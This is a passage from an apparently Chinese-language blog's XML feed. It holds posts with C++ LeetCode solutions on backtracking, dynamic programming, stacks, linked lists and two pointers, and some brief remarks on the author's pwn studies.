class="hljs-literal">false</span>;<br><br><span class="hljs-type">int</span> dr[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> dc[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (finished) <span class="hljs-keyword">return</span>;<br><br>    path.<span class="hljs-built_in">push_back</span>(r * n + c);<br>    visited[r][c] = <span class="hljs-literal">true</span>;<br>    north[c]--;<br>    west[r]--;<br><br>    <span class="hljs-keyword">if</span> (north[c] &lt; <span class="hljs-number">0</span> || west[r] &lt; <span class="hljs-number">0</span>) &#123;<br>        north[c]++;<br>        west[r]++;<br>        visited[r][c] = <span class="hljs-literal">false</span>;<br>        path.<span class="hljs-built_in">pop_back</span>();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (r == n - <span class="hljs-number">1</span> &amp;&amp; c == n - <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">bool</span> ok = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (north[i] != <span class="hljs-number">0</span> || west[i] != <span class="hljs-number">0</span>) &#123;<br>                ok = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ok) &#123;<br>            finished = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// dfs + 回溯</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> d = <span class="hljs-number">0</span>; d &lt; <span class="hljs-number">4</span>; d++) &#123;<br>        <span class="hljs-type">int</span> nr = r + dr[d];<br>        <span class="hljs-type">int</span> nc = c + dc[d];<br>        <span class="hljs-keyword">if</span> (nr &lt; <span class="hljs-number">0</span> || nc &lt; <span class="hljs-number">0</span> || nr &gt;= n || nc &gt;= n) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (!visited[nr][nc]) &#123;<br>            <span class="hljs-built_in">dfs</span>(nr, nc);<br>            <span class="hljs-keyword">if</span> (finished) <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    north[c]++;<br>    west[r]++;<br>    visited[r][c] = <span class="hljs-literal">false</span>;<br>    path.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; north[i];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) cin &gt;&gt; west[i];<br><br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x : path) cout &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>回溯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DP</title>
    <link href="/2026/01/19/DP/"/>
    <url>/2026/01/19/DP/</url>
    
    <content type="html"><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><p>我现在暂时讲不清楚</p><p>以后再说…</p><h2 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70.爬楼梯"></a>70.爬楼梯</h2><p><img src="/images/41.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">climbStairs</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(n<span class="hljs-number">+1</span>)</span></span>;<br>        dp[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>        dp[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>; i &lt;= n; i++)&#123;<br>            dp[i] = dp[i<span class="hljs-number">-1</span>] + dp[i<span class="hljs-number">-2</span>]; <span class="hljs-comment">//orz</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="118-杨辉三角"><a href="#118-杨辉三角" class="headerlink" title="118.杨辉三角"></a>118.杨辉三角</h2><p><img src="/images/42.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">generate</span>(<span class="hljs-type">int</span> numRows) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; res;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numRows; i++)&#123;<br>            <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">row</span><span class="hljs-params">(i<span class="hljs-number">+1</span>,<span class="hljs-number">1</span>)</span></span>;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; j++)&#123;<br>                row[j] = res[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] + res[i<span class="hljs-number">-1</span>][j]; <span class="hljs-comment">//ez</span><br>            &#125;<br>            res.<span class="hljs-built_in">push_back</span>(row);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198.打家劫舍"></a>198.打家劫舍</h2><p><img src="/images/43.png" alt="如图"></p><p>解：</p><p>动态规划(DP)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(n)</span></span>;<br>        dp[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>        dp[<span class="hljs-number">1</span>] = <span class="hljs-built_in">max</span>(nums[<span class="hljs-number">0</span>],nums[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; n; i++)&#123;<br>            dp[i] = <span class="hljs-built_in">max</span>(nums[i] + dp[i<span class="hljs-number">-2</span>],dp[i<span class="hljs-number">-1</span>]); <span class="hljs-comment">//思索...</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n<span class="hljs-number">-1</span>];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="279-完全平方数"><a href="#279-完全平方数" class="headerlink" title="279.完全平方数"></a>279.完全平方数</h2><p><img src="/images/44.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numSquares</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dp</span><span class="hljs-params">(n<span class="hljs-number">+1</span>, INT_MAX)</span></span>;<br>        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j * j &lt;= i; j++)&#123;<br>                dp[i] = <span class="hljs-built_in">min</span>(dp[i], dp[i - j * j] + <span class="hljs-number">1</span>); <span class="hljs-comment">//思考...</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>动态规划</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈</title>
    <link href="/2026/01/19/%E6%A0%88/"/>
    <url>/2026/01/19/%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="栈-LIFO"><a href="#栈-LIFO" class="headerlink" title="栈(LIFO)"></a>栈(LIFO)</h1><p>学pwn的看到<strong>栈</strong>真是惬意啊</p><p>不对…</p><h2 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20.有效的括号"></a>20.有效的括号</h2><p><img src="/images/26.png" alt="如图"></p><p>解：</p><p><code>后进先出</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">char</span>&gt; stk;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c : s) &#123;<br>            <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;(&#x27;</span> || c == <span class="hljs-string">&#x27;[&#x27;</span> || c == <span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">push</span>(c);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; !stk.<span class="hljs-built_in">empty</span>() &amp;&amp; stk.<span class="hljs-built_in">top</span>() == <span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;]&#x27;</span> &amp;&amp; !stk.<span class="hljs-built_in">empty</span>() &amp;&amp; stk.<span class="hljs-built_in">top</span>() == <span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(c == <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp; !stk.<span class="hljs-built_in">empty</span>() &amp;&amp; stk.<span class="hljs-built_in">top</span>() == <span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                stk.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stk.<span class="hljs-built_in">empty</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>数据结构</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表</title>
    <link href="/2026/01/19/%E9%93%BE%E8%A1%A8/"/>
    <url>/2026/01/19/%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>c语言动态内存管理中</p><p>链表结构无处不在</p><p>有fast bin这种单向链表</p><p>也有unsorted bin这种双向链表</p><p>我应该还是蛮熟悉的…</p><p>重点在于对<code>指针</code>的理解</p><p>做题过程中呢发现</p><p>核心算法是</p><p><strong>双指针</strong></p><p>那么</p><p>启动!</p><h2 id="160-相交链表"><a href="#160-相交链表" class="headerlink" title="160.相交链表"></a>160.相交链表</h2><p><img src="/images/23.png" alt="如图"></p><p>解:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode *headA, ListNode *headB)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!headA || !headB) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        ListNode* p1 = headA;<br>        ListNode* p2 = headB;  <span class="hljs-comment">//双指针</span><br>        <span class="hljs-keyword">while</span>(p1 != p2)&#123;<br>            p1 = (p1 ? p1-&gt;next : headB);<br>            p2 = (p2 ? p2-&gt;next : headA);<br>        &#125;<br>        <span class="hljs-keyword">return</span> p1;  <span class="hljs-comment">//相交节点 or nullptr</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206.反转链表"></a>206.反转链表</h2><p><img src="/images/24.png" alt="如图"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* prev = <span class="hljs-literal">nullptr</span>;<br>        ListNode* cur = head;<br><br>        <span class="hljs-keyword">while</span>(cur)&#123;<br>            ListNode* tmp = cur-&gt;next; <span class="hljs-comment">//保存节点</span><br>            cur-&gt;next = prev;<br>            prev = cur;<br>            cur = tmp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> prev;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234.回文链表"></a>234.回文链表</h2><p><img src="/images/28.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span>(fast &amp;&amp; fast-&gt;next)&#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>        &#125;<br><br>        ListNode* prev = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">while</span>(slow)&#123;<br>            ListNode* next = slow-&gt;next;<br>            slow-&gt;next = prev;<br>            prev = slow;<br>            slow = next;  <span class="hljs-comment">//反转链表</span><br>        &#125;<br>        ListNode* left = head;<br>        ListNode* right = prev;<br>        <span class="hljs-keyword">while</span>(right)&#123;<br>            <span class="hljs-keyword">if</span>(left-&gt;val != right-&gt;val)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            left = left-&gt;next;<br>            right = right-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141.环形链表"></a>141.环形链表</h2><p><img src="/images/29.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span>(fast &amp;&amp; fast-&gt;next)&#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>            <span class="hljs-keyword">if</span>(slow == fast) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="142-环形链表II"><a href="#142-环形链表II" class="headerlink" title="142.环形链表II"></a>142.环形链表II</h2><p><img src="/images/30.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">detectCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!head || !head-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        ListNode* slow = head;<br>        ListNode* fast = head;<br>        <span class="hljs-keyword">while</span>(fast &amp;&amp; fast-&gt;next)&#123;<br>            slow = slow-&gt;next;<br>            fast = fast-&gt;next-&gt;next;<br>            <span class="hljs-keyword">if</span>(slow == fast) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!fast || !fast-&gt;next) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        slow = head;<br>        <span class="hljs-keyword">while</span>(slow != fast)&#123;<br>            slow = slow-&gt;next; <span class="hljs-comment">//思考...</span><br>            fast = fast-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> slow;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21.合并两个有序链表"></a>21.合并两个有序链表</h2><p><img src="/images/31.png" alt="如图"></p><p>解：</p><p><code>双指针</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* list1, ListNode* list2)</span> </span>&#123;<br>        <span class="hljs-function">ListNode <span class="hljs-title">dummy</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;<br>        ListNode* cur = &amp;dummy;<br>        <span class="hljs-keyword">while</span>(list1 &amp;&amp; list2)&#123;<br>            <span class="hljs-keyword">if</span>(list1-&gt;val &lt;= list2-&gt;val)&#123;<br>                cur-&gt;next = list1;<br>                list1 = list1-&gt;next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                cur-&gt;next = list2;<br>                list2 = list2-&gt;next;<br>            &#125;<br>            cur = cur-&gt;next;<br>        &#125;<br>        cur-&gt;next = list1 ? list1 : list2;<br>        <span class="hljs-keyword">return</span> dummy.next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>数据结构</tag>
      
      <tag>双指针</tag>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>双指针</title>
    <link href="/2026/01/19/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    <url>/2026/01/19/%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h1><p>很经典</p><p>也很有意思</p><p>以后写…</p><h2 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283.移动零"></a>283.移动零</h2><p><img src="/images/20.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveZeroes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>; <span class="hljs-comment">//快慢双指针</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> fast = <span class="hljs-number">0</span>;fast &lt; nums.<span class="hljs-built_in">size</span>();fast++)&#123;<br>            <span class="hljs-keyword">if</span>(nums[fast] != <span class="hljs-number">0</span>)&#123;<br>                nums[slow] = nums[fast];<br>                slow++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = slow;j &lt; nums.<span class="hljs-built_in">size</span>();j++)&#123;<br>            nums[j] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11.盛最多水的容器"></a>11.盛最多水的容器</h2><p><img src="/images/21.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; 